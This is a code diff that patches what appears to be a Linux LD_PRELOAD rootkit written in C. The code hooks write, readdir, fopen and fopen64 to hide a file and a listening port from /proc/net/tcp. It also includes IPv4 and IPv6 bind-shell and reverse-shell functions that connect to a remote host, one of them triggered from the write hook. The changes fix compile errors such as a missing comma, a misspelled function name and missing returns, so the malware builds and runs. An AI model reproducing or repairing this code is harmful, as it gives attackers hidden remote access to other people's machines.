@@ -24,6 +24,7 @@
 // hex represenation of port to hide for /proc/net/tcp reads
 #define KEY_PORT "FE29"
 
+
 int ipv6_bind(void)
 {
    struct sockaddr_in6 addr;
@@ -44,7 +45,7 @@ int ipv6_bind(void)
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 
 
-   bind(sockfd, (struct sockaddr *)&addr sizeof(addr));
+   bind(sockfd, (struct sockaddr *)&addr , sizeof(addr));
 
 
    listen(sockfd, 0);
@@ -74,7 +75,9 @@ int ipv6_bind(void)
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
+   return 0;
 }
+
 
 int ipv4_bind(void)
 {
@@ -123,7 +126,9 @@ int ipv4_bind(void)
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
+   return 0;
 }
+
 
 int ipv6_rev(void)
 {
@@ -164,6 +169,7 @@ int ipv6_rev(void)
    return 0;
 }
 
+
 int ipv4_rev(void)
 {
    const char *host = REM_HOST4;
@@ -201,6 +207,7 @@ int ipv4_rev(void)
    return 0;
 }
 
+
 ssize_t write(int fildes, const void *buf, size_t nbytes)
 {
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
@@ -230,7 +237,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
-       ipb6_bind();
+       ipv6_bind();
    }
 
 
@@ -259,6 +266,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes)
    return result;
 }
 
+
 struct dirent *(*old_readdir)(DIR *dir);
 struct dirent *readdir(DIR *dirp)
 {
@@ -268,13 +276,14 @@ struct dirent *readdir(DIR *dirp)
    struct dirent *dir;
 
 
-   while (dir = old_readdir(dirp))
+   while ((dir = old_readdir(dirp)))
    {
        if (strstr(dir->d_name, FILENAME) == 0)
            break;
    }
    return dir;
 }
+
 
 FILE *(*orig_fopen64)(const char *pathname, const char *mode);
 FILE *fopen64(const char *pathname, const char *mode)
@@ -291,7 +300,7 @@ FILE *fopen64(const char *pathname, const char *mode)
    if (ptr_tcp != NULL)
    {
        char line[256];
-       FILE *temp = tmpfile64();
+       FILE *temp = tmpfile();
        fp = orig_fopen64(pathname, mode);
        while (fgets(line, sizeof(line), fp))
        {
@@ -307,6 +316,7 @@ FILE *fopen64(const char *pathname, const char *mode)
        }
        return temp;
    }
+   return 0;
 }
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
 FILE *fopen(const char *pathname, const char *mode)
@@ -342,3 +352,4 @@ FILE *fopen(const char *pathname, const char *mode)
    fp = orig_fopen(pathname, mode);
    return fp;
 }
+
